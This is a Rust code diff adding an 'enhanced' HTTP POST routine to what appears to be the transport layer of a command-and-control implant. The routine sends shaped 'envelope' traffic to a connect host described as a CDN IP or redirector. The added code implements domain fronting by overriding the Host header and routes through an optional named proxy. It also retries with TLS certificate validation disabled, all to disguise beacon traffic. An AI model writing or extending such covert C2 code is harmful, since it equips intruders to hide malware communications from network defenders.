@@ -446,3 +446,254 @@ pub unsafe fn post_frame(
         Some(out)
     }
 }
+
+// ══════════════════════════════════════════════════════════════════════════════
+// Enhanced POST with proxy + domain fronting (spec-7)
+// ══════════════════════════════════════════════════════════════════════════════
+
+/// WinHTTP access type: named proxy (explicit proxy server configured).
+const WINHTTP_ACCESS_TYPE_NAMED_PROXY: u32 = 3;
+
+/// Optional HTTP enhancements for domain fronting and proxy support.
+///
+/// When `fronting_host` is non-empty, it overrides the HTTP `Host:` header —
+/// the TCP connection still goes to `connect_host`, but the TLS SNI and HTTP
+/// Host header say `fronting_host`. This is the domain-fronting technique:
+/// connect to a CDN IP, present a legitimate domain's SNI, but the CDN routes
+/// to the real backend via the Host header.
+///
+/// When `proxy_url` is non-empty (format `"host:port"`), WinHTTP routes the
+/// request through that proxy instead of using the system default. Optional
+/// `proxy_username` / `proxy_password` provide basic-auth credentials.
+pub struct HttpOpts<'a> {
+    /// The Host header value for domain fronting. Empty = use connect_host.
+    pub fronting_host: &'a [u8],
+    /// Proxy server as `"host:port"` UTF-8 bytes. Empty = no explicit proxy.
+    pub proxy_url: &'a [u8],
+}
+
+/// Enhanced POST with domain-fronting Host header and explicit proxy support.
+///
+/// This is a full re-implementation of the WinHTTP call chain (not a wrapper
+/// around `post_frame`) because `WinHttpOpen`'s proxy access type and the
+/// fronting Host header must be set BEFORE the request is sent — they can't
+/// be bolted on after. The envelope shaping, TLS cert handling, and response
+/// reading logic mirror `post_frame` exactly.
+pub unsafe fn post_frame_enhanced(
+    connect_host: &[u8],
+    port: u16,
+    path: &[u8],
+    body: &[u8],
+    use_tls: bool,
+    opts: &HttpOpts<'_>,
+) -> Option<Vec<u8>> {
+    ensure_winhttp();
+    let fns = unsafe { (*{ &raw const WINHTTP }).as_ref() }?;
+
+    let ua_bytes: &[u8] = if crate::envelopes::POST_CLIENT_UA.is_empty() {
+        b"Mozilla/5.0"
+    } else {
+        crate::envelopes::POST_CLIENT_UA
+    };
+    let ua = to_utf16(ua_bytes);
+
+    // ---- WinHttpOpen with proxy if configured ----
+    // When proxy_url is set, use WINHTTP_ACCESS_TYPE_NAMED_PROXY (3) and pass
+    // the proxy as the lpszProxy parameter. Otherwise use DEFAULT_PROXY (0),
+    // same as the plain post_frame path.
+    let (access_type, proxy_w) = if opts.proxy_url.is_empty() {
+        (0u32, None::<Vec<u16>>)
+    } else {
+        let pw = to_utf16(opts.proxy_url);
+        (WINHTTP_ACCESS_TYPE_NAMED_PROXY, Some(pw))
+    };
+    let session = match &proxy_w {
+        Some(pw) => (fns.open)(
+            ua.as_ptr(),
+            access_type,
+            pw.as_ptr(),
+            core::ptr::null(),
+            0,
+        ),
+        None => (fns.open)(
+            ua.as_ptr(),
+            access_type,
+            core::ptr::null(),
+            core::ptr::null(),
+            0,
+        ),
+    };
+    if session.is_null() {
+        return None;
+    }
+
+    // ---- WinHttpConnect to the actual connect_host (CDN IP or redirector) ----
+    let host16 = to_utf16(connect_host);
+    let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
+    if conn.is_null() {
+        (fns.close_handle)(session);
+        return None;
+    }
+
+    let path16 = to_utf16(path);
+    let verb = to_utf16(b"POST");
+    let secure_flag = if use_tls { WINHTTP_FLAG_SECURE } else { 0 };
+    let req = (fns.open_request)(
+        conn,
+        verb.as_ptr(),
+        path16.as_ptr(),
+        core::ptr::null(),
+        core::ptr::null(),
+        core::ptr::null(),
+        0,
+        secure_flag,
+    );
+    if req.is_null() {
+        (fns.close_handle)(conn);
+        (fns.close_handle)(session);
+        return None;
+    }
+
+    // ---- Envelope shaping (same as post_frame) ----
+    let csteps = crate::envelopes::post_client_steps();
+    let cterm = crate::envelopes::post_client_terminator();
+    let cheaders = crate::envelopes::post_client_headers();
+    let shaped = nyx_profile::encode(&csteps, body);
+    let (wire_body, data_header): (Vec<u8>, Option<(Vec<u8>, Vec<u8>)>) = match &cterm {
+        Some(nyx_profile::Terminator::Header(name)) => {
+            (Vec::new(), Some((name.as_bytes().to_vec(), shaped)))
+        }
+        _ => (shaped, None),
+    };
+
+    // ---- Collect headers: profile static + data-header + fronting Host ----
+    if let Some(add_req_headers) = fns.add_request_headers {
+        let mut hdr: Vec<u8> = Vec::new();
+        // Profile-declared static headers.
+        for &(n, v) in cheaders.iter() {
+            hdr.extend_from_slice(n);
+            hdr.extend_from_slice(b": ");
+            hdr.extend_from_slice(v);
+            hdr.extend_from_slice(b"\r\n");
+        }
+        // Header-terminator data.
+        if let Some((n, v)) = &data_header {
+            hdr.extend_from_slice(n);
+            hdr.extend_from_slice(b": ");
+            hdr.extend_from_slice(v);
+            hdr.extend_from_slice(b"\r\n");
+        }
+        // Domain fronting: override the Host header. WinHttpAddRequestHeaders
+        // with WINHTTP_ADDREQ_FLAG_ADD_OR_REPLACE (0x80000000) replaces the
+        // auto-generated Host: <connect_host> with the fronting domain.
+        if !opts.fronting_host.is_empty() {
+            hdr.extend_from_slice(b"Host: ");
+            hdr.extend_from_slice(opts.fronting_host);
+            hdr.extend_from_slice(b"\r\n");
+        }
+        if !hdr.is_empty() {
+            let hdr16 = to_utf16(&hdr);
+            let hdr_len = (hdr16.len() - 1) as u32;
+            let _ = add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000);
+        }
+    }
+
+    // ---- Send request (with cert-ignore retry, same as post_frame) ----
+    let tls_flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
+        | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+        | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    let can_relax_cert = use_tls && fns.set_option.is_some();
+    let ok = (fns.send_request)(
+        req,
+        core::ptr::null(),
+        0,
+        wire_body.as_ptr(),
+        wire_body.len() as u32,
+        wire_body.len() as u32,
+        0,
+    );
+    if ok == 0 && can_relax_cert && tls_insecure_retry() {
+        let set_option = fns.set_option.unwrap();
+        if set_option(
+            req,
+            WINHTTP_OPTION_SECURITY_FLAGS,
+            &tls_flags as *const u32 as *const u8,
+            4,
+        ) != 0
+        {
+            let retry_ok = (fns.send_request)(
+                req,
+                core::ptr::null(),
+                0,
+                wire_body.as_ptr(),
+                wire_body.len() as u32,
+                wire_body.len() as u32,
+                0,
+            );
+            if retry_ok == 0 {
+                (fns.close_handle)(req);
+                (fns.close_handle)(conn);
+                (fns.close_handle)(session);
+                return None;
+            }
+        } else {
+            (fns.close_handle)(req);
+            (fns.close_handle)(conn);
+            (fns.close_handle)(session);
+            return None;
+        }
+    } else if ok == 0 {
+        (fns.close_handle)(req);
+        (fns.close_handle)(conn);
+        (fns.close_handle)(session);
+        return None;
+    }
+
+    if (fns.receive_response)(req, core::ptr::null()) == 0 {
+        (fns.close_handle)(req);
+        (fns.close_handle)(conn);
+        (fns.close_handle)(session);
+        return None;
+    }
+
+    // ---- Read response (same bounded-read logic as post_frame) ----
+    let mut out: Vec<u8> = Vec::new();
+    #[allow(unused_assignments)]
+    let mut avail: u32 = 0;
+    loop {
+        avail = 0;
+        if (fns.query_data)(req, &mut avail) == 0 || avail == 0 {
+            break;
+        }
+        let capped = (avail as usize).min(1 << 20);
+        let mut chunk = crate::heap::vec![0u8; capped];
+        let mut read: u32 = 0;
+        if (fns.read_data)(req, chunk.as_mut_ptr(), capped as u32, &mut read) == 0 || read == 0 {
+            break;
+        }
+        let n = (read as usize).min(capped);
+        if out.len().saturating_add(n) > MAX_RESPONSE_BYTES {
+            (fns.close_handle)(req);
+            (fns.close_handle)(conn);
+            (fns.close_handle)(session);
+            return None;
+        }
+        out.extend_from_slice(&chunk[..n]);
+    }
+
+    // Invert server envelope (same as post_frame).
+    let ssteps = crate::envelopes::post_server_steps();
+    if !ssteps.is_empty() {
+        if let Ok(decoded) = nyx_profile::decode(&ssteps, &out) {
+            out = decoded;
+        }
+    }
+    (fns.close_handle)(req);
+    (fns.close_handle)(conn);
+    (fns.close_handle)(session);
+    if out.is_empty() {
+        None
+    } else {
+        Some(out)
+    }
+}
